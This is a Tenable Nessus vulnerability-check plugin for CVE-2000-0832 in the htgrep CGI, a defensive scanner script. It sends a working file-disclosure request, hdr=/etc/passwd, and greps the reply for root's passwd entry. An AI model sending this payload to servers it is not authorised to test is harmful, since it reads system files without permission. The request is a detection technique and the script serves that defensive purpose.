#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10495);
 script_version ("$Revision: 1.26 $");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");

 script_cve_id("CVE-2000-0832");
 script_osvdb_id(394);
 
 script_name(english:"htgrep hdr Parameter Arbitrary File access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'htgrep' cgi is installed. This CGI has a well known security flaw
that lets anyone read arbitrary files with the privileges of the http
daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Aug/255" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/08/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/08/17");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"Checks for the presence of /cgi-bin/htgrep");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 res = http_send_recv3(
   method:"GET", 
   item:string(dir, "/htgrep/file=index.html&hdr=/etc/passwd"),
   port:port
 );
 if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

 if(egrep(pattern:".*root:.*:0:[01]:", string:res[2])){
   security_warning(port);
   exit(0);
 }
}
